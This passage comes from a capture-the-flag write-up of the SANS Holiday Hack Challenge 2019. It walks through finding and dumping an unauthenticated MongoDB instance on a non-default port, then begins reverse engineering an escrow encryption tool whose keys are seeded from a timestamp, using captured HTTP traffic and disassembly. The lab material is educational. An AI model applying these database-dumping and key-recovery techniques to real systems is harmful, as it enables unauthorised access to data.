<li><a class="reference external" href="/images/sans-christmas-challenge-2019/ba417715.png">Sixth scrap</a></li>
</ul>
<p>We can try to reconstruct the full letter in GIMP, by moving the pieces:</p>
<img alt="letter.png" class="align-center" src="/images/sans-christmas-challenge-2019/letter.png" />
<p>Here's what it says:</p>
<blockquote>
<p>From the Desk of [...]</p>
<p>Date: August 23, 20[...]</p>
<p>Memo to Self:</p>
<p>Finally! I've figured out how to destroy Christmas! Santa has a brand new
cutting edge sleigh guidance technology, called the Super Sled-o-matic.</p>
<p>I've figured out a way to poison the data going into the system so that it
will divert Santa's sled on Christmas Eve!</p>
<p>Santa will be unable to make the trip and the holiday season will be
destroyed! Santa's own technology will undermine him!</p>
<p>That's what they deserve for not listening to my suggestions for supporting
other holiday characters!</p>
<p>Bwahahahahaha!</p>
</blockquote>
<p>The upper-right corner is torn, so we can't say who it's from. But the
background drawing looks <a class="reference external" href="https://en.wikipedia.org/wiki/Human_tooth">familiar</a>...</p>
</div>
</div>
<div class="section" id="objective-10">
<h2><a class="toc-backref" href="#id34">Objective 10:</a></h2>
<div class="section" id="holly-evergreen-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id35">Holly Evergreen's Cranberry Pi Challenge</a></h3>
<p>We must help Holly find the information she's looking for in MongoDB:</p>
<div class="highlight"><pre><span></span><span class="go">Hello dear player!  Won&#39;t you please come help me get my wish!</span>
<span class="go">I&#39;m searching teacher&#39;s database, but all I find are fish!</span>
<span class="go">Do all his boating trips effect some database dilution?</span>
<span class="go">It should not be this hard for me to find the quiz solution!</span>

<span class="go">Find the solution hidden in the MongoDB on this system.</span>

<span class="gp">elf@c6444428f1f4:~$</span>
</pre></div>
<p>Let's try to connect to MongoDB:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@c6444428f1f4:~$</span> mongo
<span class="go">MongoDB shell version v3.6.3</span>
<span class="go">connecting to: mongodb://127.0.0.1:27017</span>
<span class="go">2019-12-24T11:54:26.073+0000 W NETWORK  [thread1] Failed to connect to 127.0.0.1:27017, in(checking socket for error after poll), reason: Connection refused</span>
<span class="go">2019-12-24T11:54:26.073+0000 E QUERY    [thread1] Error: couldn&#39;t connect to server 127.0.0.1:27017, connection attempt failed :</span>
<span class="go">connect@src/mongo/shell/mongo.js:251:13</span>
<span class="go">@(connect):1:6</span>
<span class="go">exception: connect failed</span>


<span class="hll"><span class="go">Hmm... what if Mongo isn&#39;t running on the default port?</span>
</span></pre></div>
<p>We can't seem to connect to MongoDB on the default port. As the hint suggests,
maybe it's running on a different port:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@c6444428f1f4:~$</span> netstat -tlpn
<span class="go">(No info could be read for &quot;-p&quot;: geteuid()=1001 but you should be root.)</span>
<span class="go">Active Internet connections (only servers)</span>
<span class="go">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span>
<span class="hll"><span class="go">tcp        0      0 127.0.0.1:12121         0.0.0.0:*               LISTEN      -</span>
</span></pre></div>
<p>Alright, there seems to be a program listening on port 12121. Let's try that:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@c6444428f1f4:~$</span> mongo --port <span class="m">12121</span>
<span class="go">MongoDB shell version v3.6.3</span>
<span class="go">connecting to: mongodb://127.0.0.1:12121/</span>
<span class="go">MongoDB server version: 3.6.3</span>
<span class="go">Welcome to the MongoDB shell.</span>
<span class="go">For interactive help, type &quot;help&quot;.</span>
<span class="go">For more comprehensive documentation, see</span>
<span class="go">        http://docs.mongodb.org/</span>
<span class="go">Questions? Try the support group</span>
<span class="go">        http://groups.google.com/group/mongodb-user</span>
<span class="go">Server has startup warnings:</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is &#39;always&#39;.</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **        We suggest setting it to &#39;never&#39;</span>
<span class="go">2019-12-24T11:53:42.670+0000 I CONTROL  [initandlisten]</span>
</pre></div>
<p>It's working! Let's list the available databases:</p>
<pre class="literal-block">
&gt; show dbs
admin   0.000GB
config  0.000GB
elfu    0.000GB
local   0.000GB
test    0.000GB
</pre>
<p>Hmm, it might take a while to search in all these databases. They don't seem
to be particularly heavy. Maybe we can dump them all and search for the
solution using regular shell tools. We can dump the content of MongoDB using
<code>mongodump</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@c6444428f1f4:~$</span> mongodump --port <span class="m">12121</span>
<span class="go">2019-12-24T11:59:43.690+0000    writing admin.system.version to</span>
<span class="go">2019-12-24T11:59:43.691+0000    done dumping admin.system.version (1 document)</span>
<span class="go">2019-12-24T11:59:43.691+0000    writing elfu.metadata to</span>
<span class="go">2019-12-24T11:59:43.691+0000    writing elfu.line to</span>
<span class="go">2019-12-24T11:59:43.691+0000    writing elfu.tincan to</span>
<span class="go">2019-12-24T11:59:43.692+0000    writing elfu.solution to</span>
<span class="go">2019-12-24T11:59:43.692+0000    done dumping elfu.line (1 document)</span>
<span class="go">2019-12-24T11:59:43.692+0000    writing elfu.bait to</span>
<span class="go">2019-12-24T11:59:43.692+0000    done dumping elfu.metadata (15 documents)</span>
<span class="go">2019-12-24T11:59:43.692+0000    writing elfu.tackle to</span>
<span class="go">2019-12-24T11:59:43.693+0000    done dumping elfu.bait (1 document)</span>
<span class="go">2019-12-24T11:59:43.693+0000    done dumping elfu.tackle (1 document)</span>
<span class="go">2019-12-24T11:59:43.693+0000    writing elfu.chum to</span>
<span class="go">2019-12-24T11:59:43.693+0000    writing test.redherring to</span>
<span class="go">2019-12-24T11:59:43.693+0000    done dumping elfu.tincan (1 document)</span>
<span class="go">2019-12-24T11:59:43.693+0000    done dumping elfu.chum (1 document)</span>
<span class="go">2019-12-24T11:59:43.740+0000    done dumping test.redherring (1 document)</span>
<span class="go">2019-12-24T11:59:43.740+0000    done dumping elfu.solution (1 document)</span>
</pre></div>
<p>Now that everything is dumped, let's take a loot at the available files:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@c6444428f1f4:~$</span> ls -lR dump/
<span class="go">dump/:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 2 elf elf 4096 Dec 24 11:59 admin</span>
<span class="go">drwxr-xr-x 2 elf elf 4096 Dec 24 11:59 elfu</span>
<span class="go">drwxr-xr-x 2 elf elf 4096 Dec 24 11:59 test</span>

<span class="go">dump/admin:</span>
<span class="go">total 8</span>
<span class="go">-rw-r--r-- 1 elf elf  59 Dec 24 11:59 system.version.bson</span>
<span class="go">-rw-r--r-- 1 elf elf 134 Dec 24 11:59 system.version.metadata.json</span>

<span class="go">dump/elfu:</span>
<span class="go">total 56</span>
<span class="go">-rw-r--r-- 1 elf elf   19 Dec 24 11:59 bait.bson</span>
<span class="go">-rw-r--r-- 1 elf elf  123 Dec 24 11:59 bait.metadata.json</span>
<span class="go">-rw-r--r-- 1 elf elf   19 Dec 24 11:59 chum.bson</span>
<span class="go">-rw-r--r-- 1 elf elf  123 Dec 24 11:59 chum.metadata.json</span>
<span class="go">-rw-r--r-- 1 elf elf   31 Dec 24 11:59 line.bson</span>
<span class="go">-rw-r--r-- 1 elf elf  123 Dec 24 11:59 line.metadata.json</span>
<span class="go">-rw-r--r-- 1 elf elf 3147 Dec 24 11:59 metadata.bson</span>
<span class="go">-rw-r--r-- 1 elf elf  127 Dec 24 11:59 metadata.metadata.json</span>
<span class="hll"><span class="go">-rw-r--r-- 1 elf elf  116 Dec 24 11:59 solution.bson</span>
</span><span class="go">-rw-r--r-- 1 elf elf  127 Dec 24 11:59 solution.metadata.json</span>
<span class="go">-rw-r--r-- 1 elf elf   24 Dec 24 11:59 tackle.bson</span>
<span class="go">-rw-r--r-- 1 elf elf  125 Dec 24 11:59 tackle.metadata.json</span>
<span class="go">-rw-r--r-- 1 elf elf   23 Dec 24 11:59 tincan.bson</span>
<span class="go">-rw-r--r-- 1 elf elf  125 Dec 24 11:59 tincan.metadata.json</span>

<span class="go">dump/test:</span>
<span class="go">total 8</span>
<span class="go">-rw-r--r-- 1 elf elf  59 Dec 24 11:59 redherring.bson</span>
<span class="go">-rw-r--r-- 1 elf elf 129 Dec 24 11:59 redherring.metadata.json</span>
</pre></div>
<p>The <code>dump/elfu/solution.bson</code> file seems promising. Let's check it:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@c6444428f1f4:~$</span> cat dump/elfu/solution.bson
<span class="go">t_id fYou did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **</span>
</pre></div>
<p>Alright, we're now supposed to run a command in MongoDB. Let's connect back to
it:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@c6444428f1f4:~$</span> mongo --port <span class="m">12121</span>
<span class="go">MongoDB shell version v3.6.3</span>
<span class="go">connecting to: mongodb://127.0.0.1:12121/</span>
<span class="go">MongoDB server version: 3.6.3</span>
<span class="go">Server has startup warnings:</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is &#39;always&#39;.</span>
<span class="go">2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **        We suggest setting it to &#39;never&#39;</span>
<span class="go">2019-12-24T11:53:42.670+0000 I CONTROL  [initandlisten]</span>
<span class="hll"><span class="gp">&gt;</span> use elfu
</span><span class="go">switched to db elfu</span>
<span class="hll"><span class="gp">&gt;</span> db.loadServerScripts<span class="o">()</span><span class="p">;</span>displaySolution<span class="o">()</span><span class="p">;</span>
</span>
<span class="go">       __/ __</span>
<span class="go">            /</span>
<span class="go">       /.&#39;o&#39;.</span>
<span class="go">        .o.&#39;.</span>
<span class="go">       .&#39;.&#39;*&#39;.</span>
<span class="go">      o&#39;.*.&#39;.*.</span>
<span class="go">     .&#39;.o.&#39;.&#39;.*.</span>
<span class="go">    .o.&#39;.o.&#39;.o.&#39;.</span>
<span class="go">       [_____]</span>
<span class="go">        ___/</span>


<span class="go">  Congratulations!!</span>
</pre></div>
</div>
<div class="section" id="recover-cleartext-document">
<h3><a class="toc-backref" href="#id36">Recover Cleartext Document</a></h3>
<img alt="small_krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" />
<p><em>Krampus says</em></p>
<blockquote>
<p>Wow! We’ve uncovered quite a nasty plot to destroy the holiday season.</p>
<p>We’ve gotta stop whomever is behind it!</p>
<p>I managed to find <a class="reference external" href="/docs/sans-christmas-challenge-2019/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc">this protected document</a>
on one of the compromised machines in our environment.</p>
<p>I think our attacker was in the process of exfiltrating it.</p>
<p>I’m convinced that it is somehow associated with the plan to destroy the
holidays. Can you decrypt it?</p>
<p>There are some smart people in the NetWars challenge room who may be able
to help us.</p>
</blockquote>
<p>So, we have what seems to be an encrypted PDF that we need to decrypt. We're
given the <a class="reference external" href="/docs/sans-christmas-challenge-2019/elfscrow.exe">elfscrow.exe</a> tool, with
<a class="reference external" href="/docs/sans-christmas-challenge-2019/elfscrow.pdb">debuging symbols</a>. You know what
it means? It's reverse engineering time!</p>
<p>Before static analysis, let's launch the <code>elfscrow.exe</code> tool, to see how
it works:</p>
<div class="highlight"><pre><span></span><span class="go">PS C:\Users\root\Documents\objectif_10&gt; .\elfscrow.exe</span>
<span class="go">Welcome to ElfScrow V1.01, the only encryption trusted by Santa!</span>


<span class="go">* WARNING: You&#39;re reading from stdin. That only partially works, use at your own risk!</span>

<span class="go">** Please pick --encrypt or --decrypt!</span>

<span class="go">Are you encrypting a file? Try --encrypt! For example:</span>

<span class="go">  C:\Users\root\Documents\objectif_10\elfscrow.exe --encrypt &lt;infile&gt; &lt;outfile&gt;</span>

<span class="go">You&#39;ll be given a secret ID. Keep it safe! The only way to get the file</span>
<span class="go">back is to use that secret ID to decrypt it, like this:</span>

<span class="go">  C:\Users\root\Documents\objectif_10\elfscrow.exe --decrypt --id=&lt;secret_id&gt; &lt;infile&gt; &lt;outfile&gt;</span>

<span class="go">You can optionally pass --insecure to use unencrypted HTTP. But if you</span>
<span class="go">do that, you&#39;ll be vulnerable to packet sniffers such as Wireshark that</span>
<span class="go">could potentially snoop on your traffic to figure out what&#39;s going on!</span>
</pre></div>
<p>So, this tool seems to be able to encrypt or decrypt documents, with the key
sent to a <a class="reference external" href="https://en.wikipedia.org/wiki/Escrow">trusted third party</a>.</p>
<p>Let's encrypt a document, and specify the <code>--insecure</code> flag, so that we
can observe network communications:</p>
<div class="highlight"><pre><span></span><span class="go">PS C:\Users\root\Documents\objectif_10&gt; .\elfscrow.exe --insecure --encrypt .\text.txt test.enc</span>
<span class="go">Welcome to ElfScrow V1.01, the only encryption trusted by Santa!</span>

<span class="go">*** WARNING: This traffic is using insecure HTTP and can be logged with tools such as Wireshark</span>

<span class="go">Our miniature elves are putting together random bits for your secret key!</span>

<span class="hll"><span class="go">Seed = 1578230480</span>
</span>
<span class="hll"><span class="go">Generated an encryption key: a0ad8f3edde93d45 (length: 8)</span>
</span>
<span class="go">Elfscrowing your key...</span>

<span class="go">Elfscrowing the key to: elfscrow.elfu.org/api/store</span>

<span class="hll"><span class="go">Your secret id is ed662e52-a681-42c8-acf9-bee4caa4f5a8 - Santa Says, don&#39;t share that key with anybody!</span>
</span><span class="go">File successfully encrypted!</span>

<span class="go">    ++=====================++</span>
<span class="go">    ||                     ||</span>
<span class="go">    ||      ELF-SCROW      ||</span>
<span class="go">    ||                     ||</span>
<span class="go">    ||                     ||</span>
<span class="go">    ||                     ||</span>
<span class="go">    ||     O               ||</span>
<span class="go">    ||     |               ||</span>
<span class="go">    ||     |   (O)-        ||</span>
<span class="go">    ||     |               ||</span>
<span class="go">    ||     |               ||</span>
<span class="go">    ||                     ||</span>
<span class="go">    ||                     ||</span>
<span class="go">    ||                     ||</span>
<span class="go">    ||                     ||</span>
<span class="go">    ||                     ||</span>
<span class="go">    ++=====================++</span>
</pre></div>
<p>Let's take a look at the HTTP communication:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/api/store</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">ElfScrow V1.01 (SantaBrowse Compatible)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">elfscrow.elfu.org</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">16</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>

a0ad8f3edde93d45
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Sun, 05 Jan 2020 14:49:04 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html;charset=utf-8</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">36</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<span class="na">X-Xss-Protection</span><span class="o">:</span> <span class="l">1; mode=block</span>
<span class="na">X-Content-Type-Options</span><span class="o">:</span> <span class="l">nosniff</span>
<span class="na">X-Frame-Options</span><span class="o">:</span> <span class="l">SAMEORIGIN</span>

ed662e52-a681-42c8-acf9-bee4caa4f5a8
</pre></div>
<p>So, it seems that the tool generates an encryption key, using a seed (that
suspiciously looks like a <a class="reference external" href="https://en.wikipedia.org/wiki/Unix_time">Unix timestamp</a>),
encrypts the document, and then sends the key to the elfscrow.elfu.org website,
which then gives us an id that will be used for decryption.</p>
<p>Let's see the decryption process:</p>
<div class="highlight"><pre><span></span><span class="go">PS C:\Users\root\Documents\objectif_10&gt; .\elfscrow.exe --id=ed662e52-a681-42c8-acf9-bee4caa4f5a8 --insecure --decrypt test.enc test.dec</span>
<span class="go">Welcome to ElfScrow V1.01, the only encryption trusted by Santa!</span>

<span class="go">*** WARNING: This traffic is using insecure HTTP and can be logged with tools such as Wireshark</span>

<span class="go">Let&#39;s see if we can find your key...</span>

<span class="go">Retrieving the key from: /api/retrieve</span>

<span class="go">We found your key!</span>
<span class="go">File successfully decrypted!</span>

<span class="go">  +----------------------+</span>
<span class="go">  |\                    /\</span>
<span class="go">  | \ ________________ / |\</span>
<span class="go">  |  |                |  | \</span>
<span class="go">  |  | +------------+ |  |  \</span>
<span class="go">  |  | |\          /| |  |   \</span>
<span class="go">  |  | | \        / | |  |    \</span>
<span class="go">  |  | |  \      /  | |  |     \</span>
<span class="go">  |  | |   \    /   | |  |     |</span>
<span class="go">  |  | |    \  /    | |  |     |</span>
<span class="go">  |  | |     \/     | |  |     |</span>
<span class="go">  |  | |            | |  |     |</span>
<span class="go">  |  | |            | |  |     |</span>
<span class="go">  |  |_|   SECRET   |_|  |     |</span>
<span class="go">  | /  +------------+  \ |     |</span>
<span class="go">  |/                    \|     |</span>
<span class="go">  +----------------------\     |</span>
<span class="go">                          \    |</span>
<span class="go">                           \   |</span>
<span class="go">                            \  |</span>
<span class="go">                             \ |</span>
<span class="go">                              \|</span>
<span class="go">                               |</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/api/retrieve</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Elfscrow 1.0 (SantaBrowse Compatible)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">elfscrow.elfu.org</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">36</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>

ed662e52-a681-42c8-acf9-bee4caa4f5a8
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Sun, 12 Jan 2020 12:37:04 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html;charset=utf-8</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">16</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<span class="na">X-Xss-Protection</span><span class="o">:</span> <span class="l">1; mode=block</span>
<span class="na">X-Content-Type-Options</span><span class="o">:</span> <span class="l">nosniff</span>
<span class="na">X-Frame-Options</span><span class="o">:</span> <span class="l">SAMEORIGIN</span>

a0ad8f3edde93d45
</pre></div>
<p>To decrypt our file, the <code>elfscrow.exe</code> tool sends our secret id to the
elfscrow.elfu.org server, which sends back our encryption key.</p>
<p>So, how can we decrypt our PDF file? If we manage to recover the secret id, we
can ask the elfscrow.elfu.org server to send the key back. However, the secret
id seems to be fully managed by the web server, and we don't have any
information on it.</p>
<p>The other way would be to look at how our encryption key is generated by the
executable. This is where having the executable and the debuging symbols is
useful. Now, I first tried analyzing it using <code>radare2</code>, however the
disassembling seemed weirdly incomplete. I then tried using Ghydra on Linux,
but loading PDB files is not supported on Linux. So, I then tried using Ghydra
on Windows, but I got an error trying to load the PDB file. Uuuuugh. Finally,
I fell back on Visual Studio, with a little bit on <code>radare2</code> on the side.</p>
<p>I followed the following Microsoft documentation to debug an executable:</p>
<ul class="simple">
<li><a class="reference external" href="https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-debug-an-executable-not-part-of-a-visual-studio-solution?view=vs-2019">Debug an app that isn't part of a Visual Studio solution</a></li>
<li><a class="reference external" href="https://docs.microsoft.com/en-us/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2019#configure-symbol-locations-and-loading-options">Specify symbol (.pdb) and source files in the Visual Studio debugger</a></li>
</ul>
<p>Let's see the list of functions in <code>radare2</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> r2 ./elfscrow.exe
<span class="go">[0x004037f7]&gt; idp ./elfscrow.pdb</span>

<span class="go">[0x004037f7]&gt; aaa</span>
<span class="go">[x] Analyze all flags starting with sym. and entry0 (aa)</span>
<span class="go">[x] Analyze len bytes of instructions for references (aar)</span>
<span class="go">[x] Analyze function calls (aac)</span>
<span class="go">[x] Use -AA or aaaa to perform additional experimental analysis.</span>
<span class="go">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span>
<span class="go">[0x004037f7]&gt; afl</span>
<span class="go">0x00401000  104 1903 -&gt; 1872 pdb.int___cdecl__getopt_internal_int__char_____const__char_const____struct_option_const____int____int</span>
<span class="go">0x00401770   64 1297 -&gt; 1260 sub.s:_illegal_option_____c_770</span>
<span class="go">0x00401c90    1 35           pdb.int___cdecl_getopt_long_only_int__char_____const__char_const____struct_option_const____int</span>
<span class="go">0x00401cc0    4 203          pdb.void___cdecl_fatal_error_char</span>
<span class="hll"><span class="go">0x00401d90    1 42           pdb.void___cdecl_super_secure_srand_int</span>
</span><span class="hll"><span class="go">0x00401dc0    1 39           pdb.int___cdecl_super_secure_random_void</span>
</span><span class="hll"><span class="go">0x00401df0    5 99           pdb.void___cdecl_generate_key_unsigned_char___const</span>
</span><span class="go">0x00401e60    1 18           fcn.00401e60</span>
<span class="go">0x00401e80    5 68           pdb.void___cdecl_to_hex_unsigned_char___const__char___const</span>
<span class="go">0x00401ed0    5 79           pdb.void___cdecl_from_hex_char___const__unsigned_char___const</span>
<span class="go">0x00401f20   25 758          pdb.void___cdecl_store_key_int__unsigned_char___const</span>
<span class="go">0x00402220    1 18           pdb.void___cdecl_retrieve_key_int__unsigned_char___const__char</span>
<span class="go">0x00402540    5 126          pdb.void___cdecl_print_hex_char____unsigned_char____unsigned_int</span>
<span class="go">0x004025c0    8 154          pdb.unsigned_char_____cdecl_read_file_char____unsigned_long_int</span>
<span class="go">0x00402660    6 103          pdb.void___cdecl_write_file_char____unsigned_char____unsigned_int</span>
<span class="go">0x004026d0    1 15           pdb.void___cdecl_do_encrypt_int__char____char</span>
<span class="go">0x00402a00    1 15           pdb.void___cdecl_do_decrypt_int__char____char____char</span>
<span class="go">0x00402d80    1 45           pdb.void___cdecl_usage_char</span>
<span class="go">0x00402db0   86 1942 -&gt; 1943 pdb._main</span>
<span class="go">0x00403546    3 15   -&gt; 122  pdb.___security_check_cookie_4</span>
<span class="go">0x004037f7   14 10   -&gt; 202  entry0</span>
<span class="go">0x00403801    1 107          pdb.___report_gsfailure</span>
<span class="go">0x00403958    1 6            pdb.__amsg_exit</span>
<span class="go">0x0040395e    3 139  -&gt; 145  pdb.__onexit</span>
<span class="go">[...]</span>
</pre></div>
<p>These three functions, <code>super_secure_srand</code>, <code>super_secure_random</code>,
and <code>generate_key</code>, seem clearly interesting.</p>
<p>Let's look at <code>generate_key</code>:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">00631</span><span class="nl">DF0:</span> <span class="err">55</span>                   <span class="nf">push</span>        <span class="nb">ebp</span>
<span class="err">00631</span><span class="nl">DF1:</span> <span class="err">8</span><span class="nf">B</span> <span class="nv">EC</span>                <span class="nv">mov</span>         <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
<span class="err">00631</span><span class="nl">DF3:</span> <span class="err">51</span>                   <span class="nf">push</span>        <span class="nb">ecx</span>
<span class="err">00631</span><span class="nl">DF4:</span> <span class="err">68</span> <span class="err">10</span> <span class="err">43</span> <span class="err">63</span> <span class="err">00</span>       <span class="nf">push</span>        <span class="mh">634310h</span>
<span class="err">00631</span><span class="nl">DF9:</span> <span class="nf">FF</span> <span class="mi">15</span> <span class="nv">CC</span> <span class="mi">40</span> <span class="mi">63</span> <span class="mi">00</span>    <span class="nv">call</span>        <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">__imp____iob_func</span> <span class="p">(</span><span class="mh">06340CCh</span><span class="p">)]</span>
<span class="err">00631</span><span class="nl">DFF:</span> <span class="err">83</span> <span class="nf">C0</span> <span class="mi">40</span>             <span class="nv">add</span>         <span class="nb">eax</span><span class="p">,</span><span class="mh">40h</span>
<span class="err">00631</span><span class="nl">E02:</span> <span class="err">50</span>                   <span class="nf">push</span>        <span class="nb">eax</span>
<span class="err">00631</span><span class="nl">E03:</span> <span class="nf">FF</span> <span class="mi">15</span> <span class="nv">C8</span> <span class="mi">40</span> <span class="mi">63</span> <span class="mi">00</span>    <span class="nv">call</span>        <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">__imp__fprintf</span> <span class="p">(</span><span class="mh">06340C8h</span><span class="p">)]</span>
<span class="err">00631</span><span class="nl">E09:</span> <span class="err">83</span> <span class="nf">C4</span> <span class="mi">08</span>             <span class="nv">add</span>         <span class="nb">esp</span><span class="p">,</span><span class="mi">8</span>
<span class="err">00631</span><span class="nl">E0C:</span> <span class="err">6</span><span class="nf">A</span> <span class="mi">00</span>                <span class="nv">push</span>        <span class="mi">0</span>
<span class="hll"><span class="err">00631</span><span class="nl">E0E:</span> <span class="nf">E8</span> <span class="mi">4</span><span class="nv">D</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       <span class="nv">call</span>        <span class="nv">time</span> <span class="p">(</span><span class="mh">0631E60h</span><span class="p">)</span>
</span><span class="err">00631</span><span class="nl">E13:</span> <span class="err">83</span> <span class="nf">C4</span> <span class="mi">04</span>             <span class="nv">add</span>         <span class="nb">esp</span><span class="p">,</span><span class="mi">4</span>
<span class="err">00631</span><span class="nl">E16:</span> <span class="err">50</span>                   <span class="nf">push</span>        <span class="nb">eax</span>
<span class="hll"><span class="err">00631</span><span class="nl">E17:</span> <span class="nf">E8</span> <span class="mi">74</span> <span class="nv">FF</span> <span class="nv">FF</span> <span class="nv">FF</span>       <span class="nv">call</span>        <span class="nv">super_secure_srand</span> <span class="p">(</span><span class="mh">0631D90h</span><span class="p">)</span>
</span><span class="err">00631</span><span class="nl">E1C:</span> <span class="err">83</span> <span class="nf">C4</span> <span class="mi">04</span>             <span class="nv">add</span>         <span class="nb">esp</span><span class="p">,</span><span class="mi">4</span>
<span class="err">00631</span><span class="nl">E1F:</span> <span class="nf">C7</span> <span class="mi">45</span> <span class="nv">FC</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="nv">mov</span>         <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">i</span><span class="p">],</span><span class="mi">0</span>
<span class="hll"><span class="err">00631</span><span class="nl">E26:</span> <span class="nf">EB</span> <span class="mi">09</span>                <span class="nv">jmp</span>         <span class="nv">generate_key</span><span class="o">+</span><span class="mh">41h</span> <span class="p">(</span><span class="mh">0631E31h</span><span class="p">)</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E28:</span> <span class="err">8</span><span class="nf">B</span> <span class="mi">45</span> <span class="nv">FC</span>             <span class="nv">mov</span>         <span class="nb">eax</span><span class="p">,</span><span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">i</span><span class="p">]</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E2B:</span> <span class="err">83</span> <span class="nf">C0</span> <span class="mi">01</span>             <span class="nv">add</span>         <span class="nb">eax</span><span class="p">,</span><span class="mi">1</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E2E:</span> <span class="err">89</span> <span class="err">45</span> <span class="nf">FC</span>             <span class="nv">mov</span>         <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">i</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E31:</span> <span class="err">83</span> <span class="err">7</span><span class="nf">D</span> <span class="nv">FC</span> <span class="mi">08</span>          <span class="nv">cmp</span>         <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">i</span><span class="p">],</span><span class="mi">8</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E35:</span> <span class="err">73</span> <span class="err">18</span>                <span class="nf">jae</span>         <span class="nv">generate_key</span><span class="o">+</span><span class="mh">5Fh</span> <span class="p">(</span><span class="mh">0631E4Fh</span><span class="p">)</span>
</span><span class="hll"><span class="err">00631</span><span class="nl">E37:</span> <span class="nf">E8</span> <span class="mi">84</span> <span class="nv">FF</span> <span class="nv">FF</span> <span class="nv">FF</span>       <span class="nv">call</span>        <span class="nv">super_secure_random</span> <span class="p">(</span><span class="mh">0631DC0h</span><span class="p">)</span>
